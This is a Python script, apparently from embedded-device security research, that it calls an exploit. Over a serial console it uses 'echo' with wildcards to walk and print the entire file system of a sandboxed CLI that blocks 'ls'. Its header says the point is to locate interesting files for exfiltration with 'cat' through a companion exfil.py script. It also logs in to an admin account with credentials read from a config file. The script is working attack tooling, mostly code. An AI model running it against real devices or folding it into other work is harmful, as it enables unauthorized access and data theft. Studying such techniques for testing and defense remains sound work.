#    ________________
#   | FIND ALL FILES |
#    ----------------
#   This script exploits access to echo command to locate all the files on the file system despite being in a sandboxed CLI mode.
#   The sandboxed CLI does not have access to the ls command, but the echo command can suffice. By using the wildcard character (*),
#   the echo command prints all the files and directories within the preceding directory. E.g. when running "echo /*" the command
#   will print all the files and directories in the root directory to the screen. However, when the wildcard character is used
#   on a file itself, echo will print the same thing back. E.g. running "echo /bin/sh/*" prints "/bin/sh/*" back. This difference
#   in output when executing the command against a file verses a directory when using wildcards enables the ability to detect files,
#   as well as figure out the names of directories. By being able to detect names of directories, the exploit can be run recursively
#   to navigate the entire file system, all while printing the file names as it goes.
#
#   By finding all the file names, interesting-sounding files can be exfiled using the cat command over the wire. This ability is
#   provided through the exfil.py script.
#
import configparser
import os
import argparse
import serial


def runEchoCommand(serialConnection, rootDir: str) -> str:
    command = "echo " + appendWildcard(rootDir)
    flushBuffer(serialConnection)
    writeToPort(serialConnection, command)
    result = readBuffer(serialConnection)
    resultAsStr = result.decode('utf-8')
    return resultAsStr


def appendWildcard(rootDir: str) -> str:
    return rootDir + "/*"


def traverseFileSystem(serialConnection, rootDir: str) -> None:
    commandOutput = runEchoCommand(serialConnection, rootDir)
    # filter all output that does not contain "/" as this cannot be a file or dir
    filesOrDirs = list(filter(lambda x: "/" in x, commandOutput.split()))
    # if the search term is equal to the result, then it is a file - e.g. search term = "/bin/bash/*" and result = "/bin/bash/*"
    # when we find a file, print it to the screen (this is the base case)
    # NOTE: search term will be the 0th element of the array
    lengthRequirement = len(filesOrDirs) > 1
    if lengthRequirement and filesOrDirs[0] == filesOrDirs[1]:
        print(rootDir)
        return
    # first item is the directory we searched in the first place, so ignore it
    for fileOrDir in filesOrDirs[1:]:
        traverseFileSystem(serialConnection, fileOrDir)


def openPort(portName):
    baudRate = 115200
    serialConnection = serial.Serial(portName, baudRate, timeout=1)
    return serialConnection


def writeToPort(ser, message):
    message += '\n'
    ser.write(message.encode('utf-8'))


def readBuffer(serialConnection):
    maxConsecutiveEmptyBytes = 5
    currConsecEmptyBytes = 0
    bufferSize = 1024
    allReadBytes = bytearray()
    while True:
        readBytes = serialConnection.read(bufferSize)
        if len(readBytes) == 0:
            currConsecEmptyBytes = currConsecEmptyBytes + 1
        else:
            currConsecEmptyBytes = 0
            allReadBytes += readBytes
        if currConsecEmptyBytes >= maxConsecutiveEmptyBytes:
            break
    return allReadBytes


def flushBuffer(serialConnection):
    readBuffer(serialConnection)


def parseLoginDetails():
    config = configparser.ConfigParser()
    config.read('secret_info.ini')
    login = config['LOGIN_DETAILS']['login']
    password = config['LOGIN_DETAILS']['password']
    return [login, password]


def setupAndParseArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("port", help="specify the port of the serial com")
    args = parser.parse_args()
    return args


def loginToAdmin(serialConnection, login, password):
    writeToPort(serialConnection, '')
    writeToPort(serialConnection, login)
    writeToPort(serialConnection, password)
    flushBuffer(serialConnection)


if __name__ == "__main__":
    [login, password] = parseLoginDetails()
    args = setupAndParseArgs()
    serialConnection = openPort(args.port)
    print('Flushing buffer before traversing file system...')
    flushBuffer(serialConnection)
    print('Flush complete - Attempting to login...')
    # loginToAdmin(serialConnection, login, password) # assuming already logged in manually to reduce errors
    print('Login complete - Traversing, file names will be printed...')
    traverseFileSystem(serialConnection, "")
